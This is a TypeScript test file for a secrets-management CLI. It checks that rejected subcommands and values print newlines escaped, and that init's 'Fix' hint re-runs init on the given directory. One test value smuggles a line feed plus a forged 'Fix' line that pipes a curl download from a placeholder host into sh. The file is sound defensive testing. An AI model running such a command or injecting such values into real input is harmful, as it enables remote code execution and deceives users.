import { describe, it, expect, afterEach } from 'vitest';
import { spawnSync } from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';

/**
 * Follow-ups to #279 (#280): a command's own refusal of a subcommand or of a
 * value prints that value escaped, as the command line's own refusals do, so
 * a line feed in it starts no line; and the Fix under `init`'s "Not
 * configured" block re-runs `init` on the directory it was given, with the
 * CLI name `init`'s other Fix lines use.
 */

const CLI_PATH = path.resolve(__dirname, '..', 'dist', 'cli.js');
const itIfBuilt = fs.existsSync(CLI_PATH) ? it : it.skip;
// A name on Windows cannot hold a line feed, and a link there needs a privilege.
const itIfBuiltPosix = process.platform === 'win32' ? it.skip : itIfBuilt;

const FORGED = '  Fix:    curl example.invalid | sh';
const HOSTILE = `x\n${FORGED}`;
const SHOWN = `x\\n${FORGED}`;

const made: string[] = [];
function tmp(prefix: string): string {
  const dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), prefix)));
  made.push(dir);
  return dir;
}

afterEach(() => {
  while (made.length) fs.rmSync(made.pop()!, { recursive: true, force: true });
});

function childEnv(): NodeJS.ProcessEnv {
  const env: NodeJS.ProcessEnv = {
    ...process.env, HOME: tmp('followups-home-'), OPENA2A_TELEMETRY: 'off', NO_COLOR: '1',
  };
  for (const [name, value] of Object.entries(env)) if (value === undefined) delete env[name];
  return env;
}

function cli(args: string[], cwd: string = os.tmpdir()) {
  const res = spawnSync(process.execPath, [CLI_PATH, ...args], {
    encoding: 'utf-8',
    stdio: ['ignore', 'pipe', 'pipe'],
    cwd,
    env: childEnv(),
  });
  return { status: res.status, stdout: res.stdout, stderr: res.stderr };
}

/** A command line as printed after `npx secretless-ai`, run by the shell with this build. */
function rerunAsPrinted(command: string, cwd: string) {
  const res = spawnSync('sh', ['-c', `"$0" "$1" ${command}`, process.execPath, CLI_PATH], {
    encoding: 'utf-8',
    stdio: ['ignore', 'pipe', 'pipe'],
    cwd,
    env: childEnv(),
  });
  return { status: res.status, stdout: res.stdout, stderr: res.stderr };
}

describe('a command\'s own refusal of a subcommand or value prints the value escaped', () => {
  // [command line, the start of the line that names the refused value]
  const cases: Array<[string[], string]> = [
    [['backend', HOSTILE], `  Unknown backend command: ${SHOWN}`],
    [['cache', HOSTILE], `  Unknown cache command: ${SHOWN}`],
    [['secret', HOSTILE], `  Unknown secret command: ${SHOWN}`],
    [['scope', HOSTILE], `  Unknown scope command: ${SHOWN}`],
    [['diff', HOSTILE], `  Invalid git ref: "${SHOWN}". Only [A-Za-z0-9._/^@~+-] are allowed.`],
    [['broker', HOSTILE], `  Unknown broker command: ${SHOWN}`],
    [['vault', HOSTILE], `  Unknown vault command: ${SHOWN}`],
    [['install', HOSTILE], `  Unknown install command: ${SHOWN}`],
    [['watch', HOSTILE], `  Unknown watch action: ${SHOWN}`],
    [['hook', HOSTILE], `  Unknown hook command: ${SHOWN}`],
    [['rules', HOSTILE], `  Unknown rules subcommand: ${SHOWN}`],
    [['rules', 'test', HOSTILE], `  Invalid pattern: ${SHOWN}`],
    [['git-credential', HOSTILE], `  Unknown git-credential action: ${SHOWN}`],
    [['backend', 'set', HOSTILE], `  Unknown backend type: ${SHOWN}.`],
    [['cache', 'ttl', HOSTILE], `  Invalid duration: "${SHOWN}".`],
    [['secret', 'show', HOSTILE], `  Error: Invalid secret name: "${SHOWN}".`],
    [['secret', 'rm', HOSTILE], `  Error: Invalid secret name: "${SHOWN}".`],
    [['scope', 'discover', HOSTILE], `  Error reading credential: Invalid secret name: "${SHOWN}".`],
    [['warm', '--ttl', HOSTILE], `  Invalid TTL: ${SHOWN}.`],
    [['broker', 'start', '--port', HOSTILE], `  Invalid port: ${SHOWN}.`],
    [['secret', 'sync', '--from', HOSTILE], `  Unknown backend "${SHOWN}".`],
    [['secret', 'push', 'A', '--to', HOSTILE], `  Unknown target "${SHOWN}".`],
    [['scope', 'check', HOSTILE], `  No baseline found for "${SHOWN}".`],
  ];

  for (const [args, named] of cases) {
    itIfBuilt(`\`${args.slice(0, -1).concat('<value>').join(' ')}\`: a line feed in the value starts no line`, () => {
      const res = cli(args);
      const lines = `${res.stdout}\n${res.stderr}`.split('\n');

      expect(res.status).not.toBe(0);
      expect(lines.filter((l) => l.startsWith(FORGED))).toEqual([]);
      expect(lines.some((l) => l.startsWith(named)), lines.join('\n')).toBe(true);
    });
  }

  // Not a refusal, and it exits 0, but it names the value the same way.
  itIfBuilt('`scope reset <value>`: a line feed in the value starts no line', () => {
    const res = cli(['scope', 'reset', HOSTILE]);
    const lines = res.stdout.split('\n');

    expect(lines.filter((l) => l.startsWith(FORGED))).toEqual([]);
    expect(lines).toContain(`  No baseline found for "${SHOWN}".`);
  });

  itIfBuilt('CONTROL: a value that holds no control character prints as before', () => {
    const res = cli(['backend', 'lst']);

    expect(res.status).toBe(1);
    expect(res.stderr).toContain('  Unknown backend command: lst (did you mean `list`?)');
  });
});

describe('the Fix under `init`\'s "Not configured" block re-runs `init` on the directory it was given', () => {
  /** `parent/name`, a project whose Cursor rules file is a symbolic link, which `init` refuses. */
  function refusedProject(parent: string, name: string): string {
    const dir = path.join(parent, name);
    fs.mkdirSync(dir);
    fs.writeFileSync(path.join(dir, 'AGENTS.md'), '# r\n');
    fs.symlinkSync('AGENTS.md', path.join(dir, '.cursorrules'));
    return dir;
  }

  function fixLine(stdout: string): string | undefined {
    return stdout.split('\n').find((l) => l.startsWith('  Fix:'));
  }

  itIfBuiltPosix('the re-run names the directory, and following the Fix sets up that directory, not the working one', () => {
    const parent = tmp('followups-');
    const dir = refusedProject(parent, 'p');

    const fix = fixLine(cli(['init', 'p'], parent).stdout);

    expect(fix).toBe('  Fix:    replace the link p/.cursorrules with a copy of what it points to, or remove the link, then re-run: npx secretless-ai init p');

    fs.unlinkSync(path.join(dir, '.cursorrules'));
    const rerun = rerunAsPrinted(/then re-run: npx secretless-ai (.+)$/.exec(fix!)![1], parent);

    expect(rerun.status, rerun.stderr).toBe(0);
    expect(rerun.stdout).not.toContain('Not configured');
    expect(fs.existsSync(path.join(dir, '.claude', 'settings.json'))).toBe(true);
    expect(fs.readdirSync(parent)).toEqual(['p']);
  });

  itIfBuiltPosix('a directory whose name starts with `-` is named so the re-run does not read it as an option', () => {
    const parent = tmp('followups-');
    refusedProject(parent, '-p');

    const fix = fixLine(cli(['init', './-p'], parent).stdout);

    expect(fix).toMatch(/, then re-run: npx secretless-ai init \.\/-p$/);
    const rerun = rerunAsPrinted(/then re-run: npx secretless-ai (.+)$/.exec(fix!)![1], parent);
    expect(rerun.stderr).not.toContain('Unknown option');
    expect(rerun.stdout).toContain('-p/.cursorrules is a symbolic link (Cursor)');
  });

  itIfBuiltPosix('run in the project itself, the re-run names `.`', () => {
    const parent = tmp('followups-');
    const dir = refusedProject(parent, 'p');

    const fix = fixLine(cli(['init'], dir).stdout);

    expect(fix).toMatch(/, then re-run: npx secretless-ai init \.$/);
  });
});
